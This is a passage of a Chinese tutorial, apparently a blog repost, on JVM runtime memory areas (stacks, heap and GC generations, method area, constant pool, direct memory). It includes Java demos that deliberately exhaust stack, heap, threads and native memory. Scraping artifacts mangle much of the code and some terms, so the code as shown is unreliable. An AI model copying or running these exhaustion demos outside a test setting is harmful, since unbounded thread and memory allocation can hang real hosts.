恢复 到 正确 的 执行 位置， 每条 线程 都 需要 有一个 独立 的 程序 计数器， 各条 线程 之间 的 计数器 互不 影响， 独立 存储， 我们 称 这类 内存 区域 为“ 线程 私有” 的 内存。 如果 线程 正在 执行 的 是 一个 Java 方法， 这个 计数器 记录 的 是 正在 执行 的 虚拟 机 字节 码 指令 的 地址； 如果 正在 执 行的 是 Natvie 方法， 这个 计数器 值 则为 空（ Undefined）。 此 内存 区域 是 唯一 一个 在 Java 虚拟 机 规范 中 没有 规定 任何 OutOfMemoryError 情况 的 区域。 1.2 Java 虚拟 机 栈 与 程序 计数器 一样， Java 虚拟 机 栈（ Java Virtual Machine Stacks） 也是 线程 私有 的， 它的 生命 周期 与 线程 相同。 虚拟 机 栈 描述 的 是 Java 方法 执行 的 内存 模型： 每个 方法 被 执行 的 时候 都会 同时 创建 一个 栈 帧（ Stack Frame[ 1]） 用于 存储 局部 变 量表、 操作 栈、 动态 链接、 方法 出口 等 信息。 每一个 方法 被 调用 直至 执行 完成 的 过程， 就 对应 着 一个 栈 帧 在 虚拟 机 栈 中 从 入栈 到 出 栈 的 过程,对于执行引擎来说，活动线程中，只有栈顶的栈帧是有效的，称为当前栈帧，这个栈帧所关联的方法称为当前方法。执行引擎所运行的所有字节码指令都只针对当前栈帧进行操作。 经常 有人 把 Java 内存 区 分为 堆 内存（ Heap） 和 栈 内存（ Stack）， 这种 分法 比较 粗糙， Java 内存 区域 的 划分 实际上 远比 这 复杂。 这种 划分 方式 的 流行 只能 说明 大多数 程序员 最 关注 的、 与 对象 内存 分配 关系 最 密切 的 内存 区域 是 这 两块。 其中 所指 的“ 堆” 在后面 会 专门 讲述， 而 所指 的“ 栈” 就是 现在 讲的 虚拟 机 栈， 或者 说是 虚拟 机 栈 中的 局部 变量 表 部分。 局部 变量 表 存放 了 编译 期 可知 的 各种 基本 数据 类型（ boolean、 byte、 char、 short、 int、 float、 long、 double）、 对象 引用（ reference 类型， 它不 等同 于 对象 本身， 根据 不同 的 虚拟 机 实现， 它可 能 是一 个 指向 对象 起始 地址 的 引用 指针， 也可能 指向 一个 代表 对象 的 句柄 或者 其他 与此 对象 相关 的 位置） 和 returnAddress 类型（ 指向 了 一条 字节 码 指令 的 地址）。 其中 64 位 长度 的 long 和 double 类型 的 数据 会 占用 2 个 局部 变量 空间（Slot）， 其余 的 数据 类型 只占 用 1 个。 局部 变量 表 所需 的 内存 空间 在编 译 期间 完成 分配， 当 进入 一个 方法 时， 这个 方法 需 要在 帧 中 分配 多大 的 局部 变量 空间 是 完全 确定 的， 在 方法 运行 期间 不会 改变 局部 变 量表 的 大小。 在 Java 虚拟 机 规范 中， 对这 个 区域 规定了 两种 异常 状况： 如果 线程 请求 的 栈 深度 大于 虚拟 机 所 允许 的 深度， 将 抛出 StackOverflowError 异常； 如果 虚拟 机 栈 可以 动态 扩展（ 当前 大部分 的 Java 虚拟 机 都可 动态 扩展， 只不过 Java 虚拟 机 规范 中 也 允许 固定 长度 的 虚拟 机 栈）， 当 扩展 时 无法 申请 到 足够 的 内存 时会 抛出 OutOfMemoryError 异常。 1.2.1 局部变量表 局部变量表是一组变量值存储空间，用于存放方法参数和方法内部定义的局部变量。在Java程序被编译成Class文件时，就在方法的Code属性的max_locals数据项中确定了该方法所需要分配的最大局部变量表的容量。 局部变量表的容量以变量槽（Slot）为最小单位，32位虚拟机中一个Slot可以存放一个32位以内的数据类型（boolean、byte、char、short、int、float、reference和returnAddress八种）。 reference类型虚拟机规范没有明确说明它的长度，但一般来说，虚拟机实现至少都应当能从此引用中直接或者间接地查找到对象在Java堆中的起始地址索引和方法区中的对象类型数据。 returnAddress类型是为字节码指令jsr、jsr_w和ret服务的，它指向了一条字节码指令的地址。 虚拟机是使用局部变量表完成参数值到参数变量列表的传递过程的，如果是实例方法（非static），那么局部变量表的第0位索引的Slot默认是用于传递方法所属对象实例的引用，在方法中通过this访问。 Slot是可以重用的，当Slot中的变量超出了作用域，那么下一次分配Slot的时候，将会覆盖原来的数据。Slot对对象的引用会影响GC（要是被引用，将不会被回收）。 系统不会为局部变量赋予初始值（实例变量和类变量都会被赋予初始值）。也就是说不存在类变量那样的准备阶段。 1.2.2 操作数栈 和局部变量区一样，操作数栈也是被组织成一个以字长为单位的数组。但是和前者不同的是，它不是通过索引来访问，而是通过标准的栈操作——压栈和出栈—来访问的。比如，如果某个指令把一个值压入到操作数栈中，稍后另一个指令就可以弹出这个值来使用。 虚拟机在操作数栈中存储数据的方式和在局部变量区中是一样的：如int、long、float、double、reference和returnType的存储。对于byte、short以及char类型的值在压入到操作数栈之前，也会被转换为int。 虚拟机把操作数栈作为它的工作区——大多数指令都要从这里弹出数据，执行运算，然后把结果压回操作数栈。比如，iadd指令就要从操作数栈中弹出两个整数，执行加法运算，其结果又压回到操作数栈中。如下演示了虚拟机是如何把两个int类型的局部变量相加，再把结果保存到第三个局部变量的： 123456begin iload_0 // push the int in local variable 0 ontothe stack iload_1 //push the int in local variable 1 onto the stack iadd // pop two ints, add them, push result istore_2 // pop int, store into local variable 2 end 1. 指令iload_0和iload_1将存储在局部变量中索引为0和1的整数压入操作数栈中 2. iadd指令从操作数栈中弹出那两个整数相加，再将结果压入操作数栈 3. istore_2则从操作数栈中弹出结果，并把它存储到局部变量区索引为2的位置。 4. 局部变量和操作数栈的状态变化，图中没有使用的局部变量区和操作数栈区域以空白表示。 1.2.3 动态连接 虚拟机运行的时候,运行时常量池会保存大量的符号引用，这些符号引用可以看成是每个方法的间接引用。如果代表栈帧A的方法想调用代表栈帧B的方法，那么这个虚拟机的方法调用指令就会以B方法的符号引用作为参数，但是因为符号引用并不是直接指向代表B方法的内存位置，所以在调用之前还必须要将符号引用转换为直接引用，然后通过直接引用才可以访问到真正的方法。 如果符号引用是在类加载阶段或者第一次使用的时候转化为直接应用，那么这种转换成为静态解析，如果是在运行期间转换为直接引用，那么这种转换就成为动态连接。 1.2.4 返回地址 方法的返回分为两种情况，一种是正常退出，退出后会根据方法的定义来决定是否要传返回值给上层的调用者，一种是异常导致的方法结束，这种情况是不会传返回值给上层的调用方法。 不过无论是那种方式的方法结束，在退出当前方法时都会跳转到当前方法被调用的位置，如果方法是正常退出的，则调用者的PC计数器的值就可以作为返回地址,，果是因为异常退出的，则是需要通过异常处理表来确定。 方法的的一次调用就对应着栈帧在虚拟机栈中的一次入栈出栈操作，因此方法退出时可能做的事情包括：恢复上层方法的局部变量表以及操作数栈，如果有返回值的话，就把返回值压入到调用者栈帧的操作数栈中，还会把PC计数器的值调整为方法调用入口的下一条指令。 1.2.5 异常 在Java 虚拟机规范中，对虚拟机栈规定了两种异常状况：如果线程请求的栈深度大于虚拟机所允许的深度，将抛出StackOverflowError 异常；如果虚拟机栈可以动态扩展（当前大部分的Java 虚拟机都可动态扩展，只不过Java 虚拟机规范中也允许固定长度的虚拟机栈），当扩展时无法申请到足够的内存时会抛出OutOfMemoryError 异常。如下代码为请求大于虚拟机堆栈深度所出现的异常 123456789101112131415161718192021 javapackage com.sf.jvm;/*** VM Args：- Xss128k*/public class JavaVMStackSOF &#123; private intstackLength=1; public void stackLeak() &#123; stackLength++; stackLeak(); &#125; public static void main(String[] args)throwsThrowable &#123; JavaVMStackSOF oom =newJavaVMStackSOF(); try&#123; oom.stackLeak(); &#125;catch(Throwable e) &#123; System.out.println(&quot; stack length:&quot; + oom.stackLength); throw e; &#125; &#125;&#125; 运行出现如下情况： 12345678stack length:22337Exception in thread &quot;main&quot; java.lang.StackOverflowErrorat com.sf.jvm.JavaVMStackSOF.stackLeak(JavaVMStackSOF.java:11)at com.sf.jvm.JavaVMStackSOF.stackLeak(JavaVMStackSOF.java:11)at com.sf.jvm.JavaVMStackSOF.stackLeak(JavaVMStackSOF.java:11)at com.sf.jvm.JavaVMStackSOF.stackLeak(JavaVMStackSOF.java:11)at com.sf.jvm.JavaVMStackSOF.stackLeak(JavaVMStackSOF.java:11)at com.sf.jvm.JavaVMStackSOF.stackLeak(JavaVMStackSOF.java:11) 1.3 本地 方法 栈 本地 方法 栈（ Native Method Stacks） 与 虚拟 机 栈 所 发挥 的 作用 是非 常 相似 的， 其 区别 不过 是 虚拟 机 栈 为 虚拟 机 执行 Java 方法（ 也就是 字节 码） 服务， 而 本地 方法 栈 则是 为 虚拟 机 使 用到 的 Native 方法 服务。 虚拟 机 规范 中 对本 地 方法 栈 中的 方法 使用 的 语言、 使用 方式 与 数据 结构 并没有 强制 规定， 因此 具体 的 虚拟 机 可以 自由 实现 它。 甚至 有的 虚拟 机（ 譬如 Sun HotSpot 虚拟 机） 直接 就把 本地 方法 栈 和 虚拟 机 栈 合二为一。 与 虚拟 机 栈 一样， 本地 方法 栈 区域 也会 抛出 StackOverflowError 和 OutOfMemoryError 异常。 对于一个运行中的 Java 程序而言，它还可能会用到一些跟本地方法相关的数据区。当某个线程调用一个本地方法时，它就进入了一个全新的并且不再受虚拟机限制的世界。本地方法可以通过本地方法接口来访问虚拟机的运行时数据区，但不止如此，它还可以做任何它想做的事情。 本地方法本质上时依赖于实现的，虚拟机实现的设计者们可以自由地决定使用怎样的机制来让 Java 程序调用本地方法。 任何本地方法接口都会使用某种本地方法栈。当线程调用 Java 方法时，虚拟机会创建一个新的栈帧并压入 Java 栈。然而当它调用的是本地方法时，虚拟机会保持 Java 栈不变，不再在线程的 Java 栈中压入新的帧，虚拟机只是简单地动态连接并直接调用指定的本地方法。 如果某个虚拟机实现的本地方法接口是使用 C 连接模型的话，那么它的本地方法栈就是 C 栈。当 C 程序调用一个 C 函数时，其栈操作都是确定的。传递给该函数的参数以某个确定的顺序压入栈，它的返回值也以确定的方式传回调用者。同样，这就是虚拟机实现中本地方法栈的行为。 很可能本地方法接口需要回调 Java 虚拟机中的 Java 方法，在这种情况下，该线程会保存本地方法栈的状态并进入到另一个 Java 栈。 这幅图展示了 JAVA 虚拟机内部线程运行的全景图。当一个线程调用一个本地方法时，本地方法又回调虚拟机中的另一个 Java 方法，一个线程可能在整个生命周期中都执行 Java 方法，操作它的 Java 栈；或者它可能毫无障碍地在 Java 栈和本地方法栈之间跳转。 该线程首先调用了两个 Java 方法，而第二个 Java 方法又调用了一个本地方法，这样导致虚拟机使用了一个本地方法栈。假设这是一个 C 语言栈，其间有两个 C 函数，第一个 C 函数被第二个 Java 方法当做本地方法调用，而这个 C 函数又调用了第二个 C 函数。之后第二个 C 函数又通过本地方法接口回调了一个 Java 方法（第三个 Java 方法），最终这个 Java 方法又调用了一个 Java 方法（它成为图中的当前方法）。内存溢出实例： 1234567891011121314151617181920212223242526272829303132333435packagecom.sf.jvm;/*** VM Args：* -Xss2M*/public classJavaVMStackOOM &#123; private void dontStop() &#123; while(true) &#123; try&#123; Thread.sleep(100000); &#125;catch(InterruptedException e) &#123; e.printStackTrace(); &#125; &#125; &#125; public void stackLeakByThread() &#123; int threadNum =0; while(true) &#123; Thread thread =newThread(newRunnable() &#123; public void run() &#123; dontStop(); &#125; &#125;); thread.start(); threadNum++; &#125; &#125; public static void main(String[] args)throwsThrowable &#123; JavaVMStackOOM oom =newJavaVMStackOOM(); oom.stackLeakByThread(); &#125;&#125;运行程序抛出如下异常：Exception in thread &quot;main&quot; java. lang. OutOfMemoryError: unable to create new native thread 1.4 Java 堆 Java 堆（ Java Heap） 是 Java 虚拟 机 所 管理 的 内存 中最 大的 一块。 Java 堆 是 被 所有 线程 共享 的 一块 内存 区域， 在 虚拟 机 启动 时 创建。 此 内存 区域 的 唯一 目的 就是 存放 对象 实例， 几乎 所有 的 对象 实例 都在 这里 分配 内存。 这一 点在 Java 虚拟 机 规范 中的 描述 是： 所有 的 对象 实例 以及 数组 都 要在 堆 上 分配[ 2]， 但是 随着 JIT 编译器 的 发展 与 逃逸 分析 技术 的 逐渐 成熟， 栈 上 分配、 标量 替换[ 3] 优化 技术 将会 导致 一些 微妙 的 变化 发生， 所有 的 对象 都 分配 在 堆 上 也 渐渐 变得 不是 那么“ 绝对” 了。 Java 堆 是 垃圾 收集 器 管理 的 主要 区域， 因此 很多 时候 也 被 称做“ GC 堆”（ Garbage Collected Heap）。 如果 从内 存 回收 的 角度 看， 由于 现在 收集 器 基本 都是 采 用的 分 代收 集 算法， 所以 Java 堆 中 还可以 细分 为： 新生代 和 老 年代； 再 细致 一点 的 有 Eden 空间、 From Survivor 空间、 To Survivor 空间 等。 如果 从内 存 分配 的 角度 看， 线程 共享 的 Java 堆 中 可能 划分 出 多个 线程 私有 的 分配 缓冲区（ Thread Local Allocation Buffer， TLAB）。 不过， 无论如何 划分， 都与 存放 内容 无关， 无论 哪个 区域， 存储 的 都 仍然是 对象 实例， 进一步 划分 的 目的 是 为了 更好 地 回收 内存， 或者 更快 地 分配 内存。 在 本章 中， 我们 仅仅 针对 内存 区域 的 作用 进行 讨论， Java 堆 中的 上述 各个 区域 的 分配 和 回收 等 细节 将会 是 下 一章 的 主题。 根据 Java 虚拟 机 规范 的 规定， Java 堆 可以 处于 物理上 不连续 的 内存 空间 中， 只要 逻辑上 是 连续 的 即可， 就 像 我们 的 磁盘 空间 一样。 在 实现 时， 既可以 实现 成 固定 大小 的， 也可以 是 可扩展 的， 不过 当前 主流 的 虚拟 机 都是 按照 可扩展 来 实现 的（ 通过- Xmx 和- Xms 控制）。Java 中的堆是 JVM 所管理的最大的一块内存空间，主要用于存放各种类的实例对象。在 Java 中，堆被划分成两个不同的区域：新生代 ( Young )、老年代 ( Old )。新生代 ( Young ) 又被划分为三个区域：Eden、From Survivor、To Survivor。这样划分的目的是为了使 JVM 能够更好的管理堆内存中的对象，包括内存的分配以及回收。如下图所示： 从图中可以看出： 堆大小 = 新生代 + 老年代。其中，堆的大小可以通过参数 –Xms、-Xmx 来指定。默认的，新生代 ( Young ) 与老年代 ( Old ) 的比例的值为 1:2 ( 该值可以通过参数 –XX:NewRatio 来指定 )，即：新生代 ( Young ) = 1/3 的堆空间大小。老年代 ( Old ) = 2/3 的堆空间大小。其中，新生代 ( Young ) 被细分为 Eden 和 两个 Survivor 区域，这两个 Survivor 区域分别被命名为 from 和 to，以示区分。默认的，Edem : from : to = 8 : 1 : 1 ( 可以通过参数 –XX:SurvivorRatio 来设定 )，即： Eden = 8/10 的新生代空间大小，from = to = 1/10 的新生代空间大小。JVM 每次只会使用 Eden 和其中的一块 Survivor 区域来为对象服务，所以无论什么时候，总是有一块 Survivor 区域是空闲着的。因此，新生代实际可用的内存空间为 9/10 ( 即 90% )的新生代空间。 GC 堆Java 中的堆也是 GC 收集垃圾的主要区域。GC 分为两种：Minor GC、Full GC ( 或称为 Major GC )。Minor GC 是发生在新生代中的垃圾收集动作，所采用的是复制算法。新生代几乎是所有 Java 对象出生的地方，即 Java 对象申请的内存以及存放都是在这个地方。Java 中的大部分对象通常不需长久存活，具有朝生夕灭的性质。当一个对象被判定为 “死亡” 的时候，GC 就有责任来回收掉这部分对象的内存空间。新生代是 GC 收集垃圾的频繁区域。当对象在 Eden ( 包括一个 Survivor 区域，这里假设是 from 区域 ) 出生后，在经过一次 Minor GC 后，如果对象还存活，并且能够被另外一块 Survivor 区域所容纳( 上面已经假设为 from 区域，这里应为 to 区域，即 to 区域有足够的内存空间来存储 Eden 和 from 区域中存活的对象 )，则使用复制算法将这些仍然还存活的对象复制到另外一块 Survivor 区域 ( 即 to 区域 ) 中，然后清理所使用过的 Eden 以及 Survivor 区域 ( 即 from 区域 )，并且将这些对象的年龄设置为 1，以后对象在 Survivor 区每熬过一次 Minor GC，就将对象的年龄 + 1，当对象的年龄达到某个值时 ( 默认是 15 岁，可以通过参数 -XX:MaxTenuringThreshold 来设定 )，这些对象就会成为老年代。但这也不是一定的，对于一些较大的对象 ( 即需要分配一块较大的连续内存空间 ) 则是直接进入到老年代。Full GC 是发生在老年代的垃圾收集动作，所采用的是标记-清除算法。现实的生活中，老年代的人通常会比新生代的人 “早死”。堆内存中的老年代(Old)不同于这个，老年代里面的对象几乎个个都是在 Survivor 区域中熬过来的，它们是不会那么容易就 “死掉” 了的。因此，Full GC 发生的次数不会有 Minor GC 那么频繁，并且做一次 Full GC 要比进行一次 Minor GC 的时间更长。另外，标记-清除算法收集垃圾的时候会产生许多的内存碎片 ( 即不连续的内存空间 )，此后需要为较大的对象分配内存空间时，若无法找到足够的连续的内存空间，就会提前触发一次 GC 的收集动作。 设置 JVM 参数为 -XX:+PrintGCDetails，使得控制台能够显示 GC 相关的日志信息，执行上面代码，下面是其中一次执行的结果。 jvm 参数 解释 -Xms 初始堆大小。如：-Xms256m -Xmx 最大堆大小。如：-Xmx512m -Xmn 新生代大小。通常为 Xmx 的 1/3 或 1/4。新生代 = Eden + 2 个 Survivor 空间。实际可用空间为 = Eden + 1 个 Survivor，即 90% -Xss JDK1.5+ 每个线程堆栈大小为 1M，一般来说如果栈不是很深的话， 1M 是绝对够用了的。 -XX:NewRatio 新生代与老年代的比例，如 –XX:NewRatio=2，则新生代占整个堆空间的 1/3，老年代占 2/3 -XX:SurvivorRatio 新生代中 Eden 与 Survivor 的比值。默认值为 8。即 Eden 占新生代空间的 8/10，另外两个 Survivor 各占 1/10 -XX:PermSize 永久代(方法区)的初始大小 -XX:MaxPermSize 永久代(方法区)的最大值 -XX:+PrintGCDetails 打印 GC 信息 -XX:+HeapDumpOnOutOfMemoryError 让虚拟机在发生内存溢出时 Dump 出当前的内存堆转储快照，以便分析用 Java 堆 用于 储存 对象 实例， 我们 只要 不断 地 创建 对象， 并且 保证 GC Roots 到 对象 之间 有可 达 路径 来 避免 垃圾 回收 机制 清除 这些 对象， 就会 在 对象 数量 到达 最 大堆 的 容量 限制 后 产生 内存 溢出 异常。实例如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152packagecom.sf.jvm;importjava.util.ArrayList;importjava.util.List;/*** VM Args：* -Xms20m -Xmx20m* -XX:+HeapDumpOnOutOfMemoryError* -XX:+PrintGCDetails*/public classHeapOutOfMemory &#123; public static void main(String[] args) &#123; outOfMemory(); &#125; static void noOutOfMemory()&#123; while(true) &#123; newOOMObject(); &#125; &#125; static void outOfMemory()&#123; List&lt;OOMObject&gt; list =newArrayList&lt;OOMObject&gt;(); while(true) &#123; list.add(newOOMObject()); &#125; &#125;&#125;classOOMObject &#123; bytemem[] =new byte[2014];&#125;异常信息如下：[GC (Allocation Failure) [PSYoungGen: 5632K-&gt;512K(6144K)] 5632K-&gt;5024K(19968K), 0.0027725 secs] [Times: user=0.00 sys=0.00, real=0.00 secs][GC (Allocation Failure) [PSYoungGen: 6144K-&gt;504K(6144K)] 10656K-&gt;11432K(19968K), 0.0022202 secs] [Times: user=0.00 sys=0.00, real=0.00 secs][Full GC (Ergonomics) [PSYoungGen: 504K-&gt;0K(6144K)] [ParOldGen: 10928K-&gt;10092K(13824K)] 11432K-&gt;10092K(19968K), [Metaspace: 2973K-&gt;2973K(1056768K)], 0.0149535 secs] [Times: user=0.02 sys=0.00, real=0.01 secs]........[Full GC (Allocation Failure) [PSYoungGen: 5632K-&gt;5632K(6144K)] [ParOldGen: 13823K-&gt;13823K(13824K)] 19455K-&gt;19455K(19968K), [Metaspace: 2973K-&gt;2973K(1056768K)], 0.0086009 secs] [Times: user=0.00 sys=0.00, real=0.01 secs]java.lang.OutOfMemoryError: Java heap spaceDumping heap to java_pid2780.hprof ...Heap dump file created [20898436 bytes in 0.027 secs][Full GC (Ergonomics) Exception in thread &quot;main&quot; java.lang.OutOfMemoryError: Java heap spaceat com.sf.jvm.OOMObject.&lt;init&gt;(HeapOutOfMemory.java:29)at com.sf.jvm.HeapOutOfMemory.outOfMemory(HeapOutOfMemory.java:23)at com.sf.jvm.HeapOutOfMemory.main(HeapOutOfMemory.java:12)[PSYoungGen: 5632K-&gt;0K(6144K)] [ParOldGen: 13823K-&gt;579K(13824K)] 19455K-&gt;579K(19968K), [Metaspace: 2973K-&gt;2973K(1056768K)], 0.0096016 secs] [Times: user=0.00 sys=0.00, real=0.01 secs]HeapPSYoungGen total 6144K, used 177K [0x00000000ff980000, 0x0000000100000000, 0x0000000100000000)eden space 5632K, 3% used [0x00000000ff980000,0x00000000ff9ac4a0,0x00000000fff00000)from space 512K, 0% used [0x00000000fff80000,0x00000000fff80000,0x0000000100000000)to space 512K, 0% used [0x00000000fff00000,0x00000000fff00000,0x00000000fff80000)ParOldGen total 13824K, used 579K [0x00000000fec00000, 0x00000000ff980000, 0x00000000ff980000)object space 13824K, 4% used [0x00000000fec00000,0x00000000fec90c20,0x00000000ff980000)Metaspace used 3005K, capacity 4496K, committed 4864K, reserved 1056768Kclass space used 326K, capacity 388K, committed 512K, reserved 1048576K 用 jvisualvm.exe 打开查看 dump，发现主要是 OOMobject 不被释放。 1.5 方法 区 1.5.1 方法区 方法 区（ Method Area） 与 Java 堆 一样， 是 各个 线程 共享 的 内存 区域， 它 用于 存储 已被 虚拟 机 加载 的 类 信息、 常量、 静态 变量、 即时 编译器 编译 后的 代码 等 数据。 虽然 Java 虚拟 机 规范 把 方法 区 描述为 堆 的 一个 逻辑 部分， 但是 它 却有 一个 别名 叫做 Non- Heap（ 非 堆）， 目的 应该 是与 Java 堆 区分 开来。 对于 习惯 在 HotSpot 虚拟 机上 开发 和 部署 程序 的 开发者 来说， 很多人 愿意 把 方法 区 称为“ 永久 代”（ Permanent Generation）， 本质上 两者 并不 等价， 仅仅 是因为 HotSpot 虚拟 机 的 设计 团队 选择 把 GC 分 代收 集 扩展 至 方法 区， 或者说 使用 永久 代 来 实现 方法 区 而已。 对于 其他 虚拟 机（ 如 BEA JRockit、 IBM J9 等） 来说 是 不存在 永久 代 的 概念 的。 即使是 HotSpot 虚拟 机 本身， 根据 官方 发布 的 路线 图 信息， 现在 也有 放弃 永久 代 并“ 搬家” 至 Native Memory 来 实现 方法 区 的 规划 了。 Java 虚拟 机 规范 对这 个 区域 的 限制 非常 宽松， 除了 和 Java 堆 一样 不需要 连续 的 内存 和 可以 选择 固定 大小 或者 可扩展 外， 还可以 选择 不实 现 垃圾 收集。 相对而言， 垃圾 收集 行为 在这 个 区域 是 比较 少 出现 的， 但 并非 数据 进入 了 方法 区 就 如 永久 代 的 名字 一样“ 永久” 存在 了。 这个 区域 的 内存 回收 目标 主要 是 针对 常量 池 的 回收 和 对 类型 的 卸载， 一般来说 这个 区域 的 回收“ 成绩” 比较 难以 令人满意， 尤其是 类型 的 卸载， 条件 相当 苛刻， 但是 这部 分 区域 的 回收 确实 是有 必要 的。 在 Sun 公司 的 BUG 列表 中， 曾 出现 过 的 若干个 严重 的 BUG 就是 由于 低 版本 的 HotSpot 虚拟 机 对此 区域 未完 全 回收 而 导致 内存 泄漏。 根据 Java 虚拟 机 规范 的 规定， 当 方法 区 无法 满足 内存 分配 需求 时， 将 抛出 OutOfMemoryError 异常。方法 区 用于 存放 Class 的 相关 信息， 如 类 名、 访问 修饰 符、 常量 池、 字段 描述、 方法 描述 等。 对于 这个 区域 的 测试， 基本 的 思路 是 运行时 产生 大量 的 类 去 填满 方法 区， 直到 溢出。 虽然 直接 使用 Java SE API 也可以 动态 产生 类（ 如 反射 时 的 GeneratedConstructorAccessor 和 动态 代理 等）， 但在 本次 实验 中 操作 起来 比较 麻烦。 在 代码 清单 2- 5 中， 笔者 借助 CGLib[ 3] 直接 操作 字节 码 运行时， 生成 了 大量 的 动态 类。 值得 特别 注意 的 是， 我们 在这 个 例子 中 模拟 的 场景 并非 纯粹 是一 个 实验， 这样 的 应用 经常 会 出现 在 实际 应用 中： 当前 的 很多 主流 框架， 如 Spring 和 Hibernate 对 类 进行 增强 时， 都会 使用 到 CGLib 这类 字节 码 技术， 增 强的 类 越多， 就 需要 越大 的 方法 区 来 保证 动态 生成 的 Class 可以 加载 入 内存。 方法 区 溢出 也是 一种 常见 的 内存 溢出 异常， 一个 类 如果 要被 垃圾 收集 器 回收 掉， 判定 条件 是非 常 苛刻 的。 在 经常 动态 生成 大量 Class 的 应用 中， 需要 特别 注意 类 的 回收 状况。 这类 场景 除了 上面 提到 的 程序 使用 了 GCLib 字节 码 增强 外， 常见 的 还有： 大量 JSP 或 动态 产生 JSP 文件 的 应用（ JSP 第一次 运行时 需要 编译 为 Java 类）、 基于 OSGi 的 应用（ 即使是 同一个 类 文件， 被 不同 的 加载 器 加载 也会 视为 不同 的 类） 等。 代码 清单 2- 5 借助 CGLib 使得 方法 区 出现 内存 溢出 异常 12345678910111213141516171819202122232425262728packagecom.sf.jvm;/*** VM Args： -XX: PermSize= 10M -XX: MaxPermSize= 10M*/public class JavaMethodAreaOOM &#123; public static void main(String[] args) &#123; while(true) &#123; Enhancer enhancer =newEnhancer(); enhancer.setSuperclass(OOMObject.class); enhancer.setUseCache(false); enhancer.setCallback(newMethodInterceptor() &#123; public Object intercept(Object obj, Method method, Object[] args, MethodProxy proxy)throwsThrowable &#123; returnproxy.invokeSuper(obj, args); &#125; &#125;); enhancer.create(); &#125; &#125; static classOOMObject &#123; &#125;&#125;运行 结果：Caused by: java. lang. OutOfMemoryError: PermGen space at java. lang. ClassLoader. defineClass1( Native Method)at java. lang. ClassLoader. defineClassCond( ClassLoader. java: 632) at java. lang. ClassLoader. defineClass( ClassLoader. java: 616） 1.5.2 运行时常量池 运行时 常量 池（ Runtime Constant Pool） 是 方法 区 的 一部分。 Class 文件 中 除了 有 类 的 版本、 字段、 方法、接口 等 描述 等 信息 外， 还有 一项 信息 是 常量 池（ Constant Pool Table）， 用于 存放 编译 期 生成 的 各种 字面 量 和 符号 引用， 这部 分 内容 将 在 类 加载 后 存放 到 方法 区 的 运行时 常量 池 中。 Java 虚拟 机 对 Class 文件 的 每一 部分（ 自然 也 包括 常量 池） 的 格式 都有 严格 的 规定， 每一个 字节 用于 存储 哪种 数据 都 必须 符合 规范 上 的 要求， 这样 才会 被 虚拟 机 认可、 装载 和 执行。 但 对于 运行时 常量 池， Java 虚拟 机 规范 没有 做 任何 细节 的 要求， 不同 的 提供 商 实现 的 虚拟 机 可以 按照 自己的 需要 来 实现 这个 内存 区域。 不过， 一般来说， 除了 保存 Class 文件 中 描述 的 符号 引用 外， 还会 把 翻译 出来 的 直接 引用 也 存储 在 运行时 常量 池 中[ 4]。 运行时 常量 池 相对于 Class 文件 常量 池 的 另外 一个 重要 特征 是 具备 动态 性， Java 语言 并不 要求 常量 一定 只能 在 编译 期 产生， 也就是 并非 预置 入 Class 文件 中 常量 池 的 内容 才能 进入 方法 区 运行时 常量 池， 运行 期间 也可 能将 新的 常量 放入 池 中， 这种 特性 被 开发 人员 利用 得比 较多 的 便是 String 类 的 intern() 方法。 既然 运行时 常量 池 是 方法 区 的 一部分， 自然 会受 到 方法 区 内存 的 限制， 当 常量 池 无法 再 申请 到 内存 时会 抛出 OutOfMemoryError 异常。 123456789101112131415161718192021package com.sf.jvm;importjava.util.ArrayList;importjava.util.List;/*** VM Args：- XX:PermSize=10M -XX:MaxPermSize=10M*/public class RuntimeConstantPoolOOM &#123; public static void main(String[] args) &#123; // 使用 List 保持 着 常量 池 引用， 避免 Full GC 回收 常量 池 行为 List&lt;String&gt; list =new ArrayList&lt;String&gt;(); // 10MB 的 PermSize 在 integer 范围内 足够 产生 OOM 了 int i = 0; while(true) &#123; list.add(String.valueOf(i++ +&quot;xxxxxxxxxxxxxxxxxxxxx&quot;).intern()); &#125; &#125;&#125;运行异常：Exception in thread &quot;main&quot; java. lang. OutOfMemoryError: PermGen space at java. lang. String. intern( Native Method) at org. fenixsoft. oom. RuntimeConstantPoolOOM. main( RuntimeConstantPoolOOM. java:... 1.7 直接 内存 直接内存（DirectMemory）并不是虚拟机运行时数据区的一部分，也不是Java虚拟机规范中定义的内存区域，但是这部分内存也被频繁地使用，而且也可能导致OutOfMemoryError异常出现，所以我们放到这里一起讲解。在JDK1.4中新加入了NIO（NewInput/Output）类，引入了一种基于通道（Channel）与缓冲区（Buffer）的I/O方式，它可以使用Native函数库直接分配堆外内存，然后通过一个存储在Java堆里面的DirectByteBuffer对象作为这块内存的引用进行操作。这样能在一些场景中显著提高性能，因为避免了在Java堆和Native堆中来回复制数据。显然，本机直接内存的分配不会受到Java堆大小的限制，但是，既然是内存，则肯定还是会受到本机总内存（包括RAM及SWAP区或者分页文件）的大小及处理器寻址空间的限制。服务器管理员配置虚拟机参数时，一般会根据实际内存设置-Xmx等参数信息，但经常会忽略掉直接内存，使得各个内存区域的总和大于物理内存限制（包括物理上的和操作系统级的限制），从而导致动态扩展时出现OutOfMemoryError异常。DirectMemory容量可通过-XX：MaxDirectMemorySize指定，如果不指定，则默认与Java堆的最大值（-Xmx指定）一样。越过了DirectByteBuffer类，直接通过反射获取Unsafe实例并进行内存分配（Unsafe类的getUnsafe()方法限制了只有引导类加载器才会返回实例，也就是设计者希望只有rt.jar中的类才能使用Unsafe的功能）。因为，虽然使用DirectByteBuffer分配内存也会抛出内存溢出异常，但它抛出异常时并没有真正向操作系统申请分配内存，而是通过计算得知内存无法分配，于是手动抛出异常，真正申请分配内存的方法是unsafe.allocateMemory()。如下实例为直接内存溢出。 12345678910111213141516171819202122package com.sf.jvm;import sun.misc.Unsafe;import java.lang.reflect.Field;import staticcom.sun.deploy.util.BufferUtil.MB;/*** VM Args：- Xmx20M -XX: MaxDirectMemorySize= 10M*/public classDirectMemoryOOM &#123; private static final int_1MB=1024*1024; public static void main(String[] args)throwsException &#123; Field unsafeField = Unsafe.class.getDeclaredFields()[0]; unsafeField.setAccessible(true); Unsafe unsafe = (Unsafe) unsafeField.get(null); while(true) &#123; unsafe.allocateMemory(_1MB); &#125; &#125;&#125;运行异常：Exception in thread &quot;main&quot; java.lang.OutOfMemoryErrorat sun.misc.Unsafe.allocateMemory(Native Method)at com.sf.jvm.DirectMemoryOOM.main(DirectMemoryOOM.java:20) 1.8 对象的访问 